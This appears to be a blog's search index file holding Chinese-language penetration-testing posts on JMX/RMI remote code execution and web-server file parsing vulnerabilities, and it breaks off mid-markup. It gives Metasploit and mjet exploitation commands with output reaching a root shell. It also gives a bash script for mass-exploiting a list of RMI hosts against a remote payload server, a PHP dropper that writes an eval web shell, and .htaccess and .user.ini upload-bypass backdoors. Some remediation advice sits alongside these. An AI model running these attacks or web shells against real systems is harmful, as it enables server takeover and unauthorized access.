<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/04/21/SQL-Injection-Types/"/>
      <url>/2024/04/21/SQL-Injection-Types/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JMX RMI RCE</title>
      <link href="/2020/07/29/JMX-RMI-RCE/"/>
      <url>/2020/07/29/JMX-RMI-RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="JMX-RMI-RCE"><a href="#JMX-RMI-RCE" class="headerlink" title="JMX RMI RCE"></a>JMX RMI RCE</h2><h3 id="JMX"><a href="#JMX" class="headerlink" title="JMX"></a>JMX</h3><p>JMX的全称为Java Management Extensions,是管理Java的一种扩展。这种机制可以方便的管理正在运行中的Java程序。常用于管理线程，内存，日志Level，服务重启，系统环境等。</p><p>它除了能提供一些通用的信息以外，还能通过特定的编程接口提供一些针对具体程序的专有信息并在JConsole等JMX客户端工具中展示，具体点说就是程序员可以把需要展示的信息放在一种叫做MBean的Java对象内，然后JConsole之类的客户端工具可以连接到JMX服务，识别MBean并在图形界面中显示。从纯抽象的角度触发，这其实有点像浏览器发送一个请求给http服务器，然后http服务器执行浏览器的请求并返回相应的数据，从某种角度来说JConsole和JMX也是以这种方式工作的，只是它们使用的协议不是http，交换数据协议格式不是http数据包，但是他们的确是以客户端&#x2F;服务器这种模式工作的，而且完成的事情也差不多。</p><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI（Remote Method Invocation，远程方法调用）是用Java在JDK1.2中实现的，它大大增强了Java开发分布式应用的能力。Java作为一种风靡一时的网络开发语言，其巨大的威力就体现在它强大的开发分布式网络应用的能力上，而RMI就是开发百分之百纯Java的网络分布式应用系统的核心解决方案之一。其实它可以被看作是RPC(远程过程调用)的Java版本。但是传统RPC并不能很好地应用于分布式对象系统。而Java RMI 则支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。</p><h3 id="连接器概念"><a href="#连接器概念" class="headerlink" title="连接器概念"></a>连接器概念</h3><p>JMX规范定义了连接器的概念(Connectors),连接器位于JMX的3层构架中的分布式服务层。连接器负责建立 <code>MBean </code>服务器和管理应用之间的通信。连接器由一个驻留在代理层的连接器服务器(connector server)和管理应用的连接器客户端(connector client)构成。连接器服务端(connector server)连接到 <code>MBean </code>服务器并监听来自客户端(connector client)的请求。一个connector client负责与connector server建立连接。<code>connector client</code>通常与connector server在不同的JVM里并且通常运行在不同的机器上。</p><p><strong>1.连接器类型(Connector type)</strong></p><p><code>connector client</code>通过给定协议与connector server建立连接，远程访问 <code>MBean </code>服务器。JMX API允许使用不同类型的连接器来连接 <code>MBean</code>服务器。<br>* JMX API定义了一个标准连接器 - RMI Connector,它支持通过RMI协议远程访问一个MBeanServer<br>* JMX API定义了一个可选的连接器 - JMXMP Connector.它实现了JMXMP协议(JMX Message Protocol).作为一个可选连接器，它不集成在JavaSE平台中，若需要，从Sun官方下载jar<br>* 用户自定义连接器协议</p><p><strong>2.连接器服务器地址</strong></p><p>通常，一个connector server有一个地址，由类 <code>JMXServiceURL </code>表示，这个类的实例是不可变的。使用不同的连接器，会有不同的 <code>JMXServiceURL </code>编写方式。 格式看起来如下： service:jmx:protocol:sap 说明： service:jmx: 这个是JMX URL的标准前缀，所有的JMX URL都必须以该字符串开头。 protocol是指定连接连接器服务器(connector server)的传输协议 方括号中的部分为可选部分 sap是连接器服务器的地址，sap的语法格式:<code>//[host[:port]][url-path]</code> host表示主机名，port是十进制的端口号 host和port可以省略，但没有host时，不能出现port url-path 开始于一个”&#x2F;“符号 参考JMX API :<code> http://docs.[Oracle](http://lib.csdn.net/base/oracle).com/javase/8/docs/api/index.html?javax/management/remote/rmi/package-summary.html</code></p><p>参考：<code>http://www.l99.com/EditText_view.action?textId=480750</code></p><p><strong>3. RMI连接器</strong></p><p>JMX API定义了一个标准连接器 - RMI Connector,它支持通过RMI远程访问一个MBeanServer</p><p>RMI连接器服务器的地址示例如下：<br><code>service:jmx:rmi://localhost:1099/jndi/rmi://localhost:8899/myname</code><br>说明：<br>在这个JMXServiceURL中，第一个rmi指的是rmi连接器，表示用连接器使用RMI传输协议，第二个rmi指定RMI注册RMI连服务接器存储存根<br>localhost:1099: 这个是connector server的IP和端口，该部分是一个可选项，可以被省略掉。如果省略的话，则connector server会随机任意选择一个可用的端口<br>&#x2F;<code>jndi/rmi://localhost:8899/myname </code>: 这个是connector server的路径，表示Connector server的stud是使用JNDI API绑定在 <code>rmi://localhost:8899/myname</code>这个地址上</p><p>创建一个RMI connector server</p><p>通常是提供一个RMI connector server的连接器地址，用 <code>JMXConnectorServerFactory.newJMXConnectorServer </code>方法来创建 <code>RMI connector cerver</code></p><p>参考JMX API：<code>http://docs.[oracle](http://lib.csdn.net/base/oracle).com/javase/8/docs/api/index.html?javax/management/remote/rmi/package-summary.html</code></p><h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>使用nmap进行端口扫描,发现该机器开放了8999端口,一个不常见的端口,所以我们需要识别它的服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 8999 ip</span><br></pre></td></tr></table></figure><p>识别出来是JAVA RMI</p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>检测服务漏洞,这里提供两种方式msf和nmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/misc/java_rmi_server</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=rmi-vuln-classloader -p 8999 ip</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>主要使用mjet,这里提供两个关于mjet的利用类型</p><p><a href="https://github.com/mogwaisec/mjet">mjet-java</a></p><p><a href="https://github.com/x-f1v3/mjet">mjet-python</a></p><p>使用方式见README</p><p><strong>mjet-java用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/misc/java_jmx_server</span><br><span class="line">或者</span><br><span class="line">use exploit/multi/misc/java_mlet_server</span><br></pre></td></tr></table></figure><p>该示例使用以下系统：</p><p>攻击者：192.168.178.1</p><p>目标:192.168.178.200，在tcp端口1616(目标端口)上运行的JMX服务</p><ul><li>配置&#x2F;启动metasploit模块“ java_mlet_server”。该模块将作为后台作业运行</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/misc/java_mlet_server</span><br><span class="line">msf &gt; set LHOST 192.168.178.1</span><br><span class="line">msf &gt; set SRVHOST 192.168.178.1</span><br><span class="line">msf &gt; set URIPATH /mlet/</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>使用mjet.jar连接到易受攻击的JMX服务，并提供指向MLet Web服务器的URL。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar mjet.jar -t 192.168.178.200 -p 1616 -u http://192.168.178.1:8080/mlet/</span><br></pre></td></tr></table></figure><p><strong>mjet-pyhton用法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py ip port install passwd 攻击者ip  监听端口</span><br><span class="line"></span><br><span class="line">../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 command passwd &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p><strong>msf攻击</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use java/meterpreter/reverse_tcp</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; set LHOST 127.0.0.1(监听)</span><br><span class="line">LHOST =&gt; 127.0.0.1</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444(监听)</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; use exploit/multi/misc/java_jmx_server</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; set RHOST 127.0.0.1(目标)</span><br><span class="line">RHOST =&gt; 127.0.0.1</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; set RPORT 18983</span><br><span class="line">RPORT =&gt; 18983(目标)</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; run</span><br><span class="line"></span><br><span class="line">[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?</span><br><span class="line">[*] Started reverse TCP handler on 127.0.0.1:4444 </span><br><span class="line">[*] 127.0.0.1:18983 - Using URL: http://0.0.0.0:8080/ka4B2HQsM</span><br><span class="line">[*] 127.0.0.1:18983 - Local IP: http://172.16.65.171:8080/ka4B2HQsM</span><br><span class="line">[*] 127.0.0.1:18983 - Sending RMI Header...</span><br><span class="line">[*] 127.0.0.1:18983 - Discovering the JMXRMI endpoint...</span><br><span class="line">[+] 127.0.0.1:18983 - JMXRMI endpoint on 127.0.1.1:18983</span><br><span class="line">[*] 127.0.0.1:18983 - Proceeding with handshake...</span><br><span class="line">[+] 127.0.0.1:18983 - Handshake with JMX MBean server on 127.0.1.1:18983</span><br><span class="line">[*] 127.0.0.1:18983 - Loading payload...</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for mlet</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for payload JAR</span><br><span class="line">[*] 127.0.0.1:18983 - Executing payload...</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for payload JAR</span><br><span class="line">[*] Sending stage (53837 bytes) to 127.0.0.1</span><br><span class="line">[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:40740) at 2019-12-06 14:20:04 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p><strong>利用msf批量打RMI</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rmi-ip.txt是存放的ip与端口文件，直接执行。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">msf监听到并且直接获取会话session。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">function getip()&#123;</span><br><span class="line">while read i</span><br><span class="line">do</span><br><span class="line">    timeout 2s java -jar mjet.jar -u http://1.1.1.1:8080/bobac/ -t `echo $i|awk &#x27;&#123;print $1&#125;&#x27;` -p `echo $i|awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">done &lt; rmi-ip.txt</span><br><span class="line">&#125;</span><br><span class="line">getip</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>RMI漏洞主要利用的是远程过程调用,即从Client到Server过程中调用JAVA方法，对于EXP的编写我们需要跟踪代码到具体的方法进行EXP构造</p>]]></content>
      
      
      
        <tags>
            
            <tag> Intranet Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File Parsing Vulnerabilities</title>
      <link href="/2020/07/02/File-Parsing-Vulnerabilities/"/>
      <url>/2020/07/02/File-Parsing-Vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>文件解析漏洞,是指Web容器（Apache、nginx、iis等）在解析文件时出现了漏洞,以其他格式执行出脚本格式的效果。从而,黑客可以利用该漏洞实现非法文件的解析。</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-0cbcec2ee7ee2355.png" alt="图片.png"></p><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><h3 id="多后缀"><a href="#多后缀" class="headerlink" title="多后缀"></a>多后缀</h3><p><strong>原理</strong></p><p>在Apache1.x，2.x中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。</p><p><strong>因此我可以上传一个test.php.qwer文件绕过验证且服务器依然会将其解析为php。<br>Apache能够认识的文件在mime.types文件里</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-9910b0448ece548a.png" alt="图片.png"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p><strong>后缀验证尽量使用白名单的方式，这样即使使用不存在的后缀名，也无法绕过。</strong></p><h3 id="配置问题导致漏洞"><a href="#配置问题导致漏洞" class="headerlink" title="配置问题导致漏洞"></a>配置问题导致漏洞</h3><ul><li>如果在 Apache 的 conf 里有这样一行配置 <code>AddHandler php5-script .php</code> 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。</li><li>如果在 Apache 的 conf 里有这样一行配置 <code>AddType application/x-httpd-php .jpg</code>即使扩展名是 jpg，一样能以 php 方式执行。</li></ul><h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p><strong>1. apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ “.(php.|php3.)”&gt;</span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure><p>2.<strong>用伪静态能解决这个问题，重写类似<code>.php.\*</code>这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules&#x2F;mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteRule .(php.|php3.) /index.php</span><br><span class="line">RewriteRule .(pHp.|pHp3.) /index.php</span><br><span class="line">RewriteRule .(phP.|phP3.) /index.php</span><br><span class="line">RewriteRule .(Php.|Php3.) /index.php</span><br><span class="line">RewriteRule .(PHp.|PHp3.) /index.php</span><br><span class="line">RewriteRule .(PhP.|PhP3.) /index.php</span><br><span class="line">RewriteRule .(pHP.|pHP3.) /index.php</span><br><span class="line">RewriteRule .(PHP.|PHP3.) /index.php</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><h3 id="畸形后缀"><a href="#畸形后缀" class="headerlink" title="畸形后缀"></a>畸形后缀</h3><p>Apache配置文件中会有<code>.+.ph(p[345]?|t|tml)</code>此类的正则表达式，被当php程序执行的文件名要符合正则表达式，否则就算Apache把某文件当php程序，php自己不认它，也是无用。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200702164453356.png" alt="image-20200702164453356"></p><p>也就是说<code>php3，php4，php5，pht，phtml</code>也是可以被解析的。</p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p><strong>一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）</strong><br>要想使.htaccess文件生效，需要两个条件:<br><strong>一是在Apache的配置文件中写上：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure><p><strong>二是Apache要加载mod_Rewrite模块。加载该模块，需要在Apache的配置文件中写上：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><p>若是在Ubuntu中，可能还需要执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo a2enmod rewrite</span><br></pre></td></tr></table></figure><p>配置完后需要重启Apache。</p><p><strong>.htaccess文件可以配置很多事情，如是否开启站点的图片缓存、自定义错误页面、自定义默认文档、设置WWW域名重定向、设置网页重定向、设置图片防盗链和访问权限控制。但我们这里只关心.htaccess文件的一个作用——MIME类型修改。如在.htaccess文件中写入：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php xxx</span><br></pre></td></tr></table></figure><p><strong>就成功地使该.htaccess文件所在目录及其子目录中的后缀为.xxx的文件被Apache当做php文件。</strong><br><strong>另一种写法是：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>该语句会让Apache把shell.jpg文件解析为php文件。</p><p>故 我们可以先上传 .htaccess ，然后再上传含有shell的文件</p><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><h3 id="对比-htaccess"><a href="#对比-htaccess" class="headerlink" title="对比.htaccess"></a>对比.htaccess</h3><p><code>.user.ini</code>，它比<code>.htaccess</code>用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm&#x2F;fastcgi，我的IIS php5.3以上的全部用的fastcgi&#x2F;cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。</p><h3 id="什么是-user-ini"><a href="#什么是-user-ini" class="headerlink" title="什么是.user.ini"></a>什么是.user.ini</h3><p>php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/5ad87a713b6248f47c25c28c881e204bb3f92b16.jpg" alt="img"></p><p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p><p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/da88a3b19d2342cda25cf96e28993fd57dee4559.jpg" alt="img"></p><p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/e9620fbd3fbc9aa5fc043cb4079b3361595cc926.jpg" alt="img"></p><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=01.gif</span><br></pre></td></tr></table></figure><p>01.gif是要包含的文件。</p><p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p><p>测试一下，我分别在IIS6.0+Fastcgi+PHP5.3和nginx+fpm+php5.3上测试。 目录下有.user.ini，和包含webshell的01.gif，和正常php文件echo.php：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/3a69a5d69cb337bb5ee67d9cc452d239b8cec0dc.jpg" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1c054af65f57ca9063a7446ccc7de65da38c7e8a.jpg" alt="img"></p><p>访问echo.php即可看到后门：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/7df48ae02617076a3d1912def51b76d2ad374ebd.jpg" alt="img"></p><p>Nginx下同样：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/097abc067a74ab351d5769a9e47e6c3c0b40e190.jpg" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/8a9fbe51fc4c149b3f15096d28e35394e4eb9ce3.jpg" alt="img"></p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p> 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p><h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><h3 id="PHP-CGI解析漏洞"><a href="#PHP-CGI解析漏洞" class="headerlink" title="PHP CGI解析漏洞"></a>PHP CGI解析漏洞</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-ef9717d27ce7f505.png" alt="图片.png"><br><strong>当访问xx.com&#x2F;phpinfo.jpg&#x2F;1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI。</strong></p><p><strong>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问xx.com&#x2F;phpinfo.jpg&#x2F;1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</strong></p><p>简言之，如果fix_pathinfo开启，并且Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME，那么上传phpinfo.jpg&#x2F;1.php，phpinfo.jpg就会被当作PHP文件解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com/UploadFiles/image/1.jpg/1.php  </span><br><span class="line">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</span><br></pre></td></tr></table></figure><p><strong>另外一种手法：上传一个名字为test.jpg，以下内容的文件。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>然后访问test.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。</strong></p><p><strong>这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-85fb966ca25aad8a.png" alt="图片.png"><br><strong>这个往前递归的功能原本是想解决&#x2F;info.php&#x2F;test这种URL，能够正确解析到info.php。</strong></p><p><strong>在Nginx配置fastcgi使用php时，会存在文件类型解析问题。其实可以说它与Nginx本身关系不大，Nginx只是作为一个代理把请求转发给fastcgi Server，PHP在后端处理这一切。因此在其他fastcgi环境下，PHP也存在此问题，只是使用Nginx作为Web Server时，一般使用fastcgi的方式调用脚本解释器，这种使用方式最为常见。</strong></p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li><p>1）使用Apache、IIS等成熟久经考验的服务器软件，在动态语言的支持上，Nginx还是太年经了。你应该也偶尔会见到有些网站挂掉了显示个nginx错误出来，却极少见网站挂掉显示不是nginx的(未备案，过期欠费 等等除外)。</p></li><li><p>2）上传目录、静态资源（CSS&#x2F;JS&#x2F;图片等）目录，都设置好屏蔽PHP执行权限。例如使用Apache服务器的<br>在相应目录下放一个 .htaccess 文件，里面写上</p></li><li><pre><code class="js">&lt;FilesMatch &quot;(?i:\.php)$&quot;&gt;    Deny from all&lt;/FilesMatch&gt;3）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 3）可以不提供原图访问，所有图片输出时都经过程序处理，也可以在上传存储时就处理一遍根本不保存原图；</span><br><span class="line"></span><br><span class="line">- 4）图片使用不同的服务器，这样可以与业务代码数据完全隔离，即使图片服务器被黑了，也不会泄漏多少信息；</span><br><span class="line"></span><br><span class="line">- 5)cgi.fix_pathinfo=0慎用，除非你十分确定该服务器上的所有项目都不会因此而无法运行。</span><br><span class="line"></span><br><span class="line">### 空字节代码执行漏洞</span><br><span class="line"></span><br><span class="line">旧版本（0.5.*，**0.6.*，0.7，0.8&lt;=0.7.65&lt;=0.8.37）。通过利用此漏洞，攻击者可以导致服务器使用PHP的FastCGI作为PHP的服务器上执行任何公开访问的文件。</span><br><span 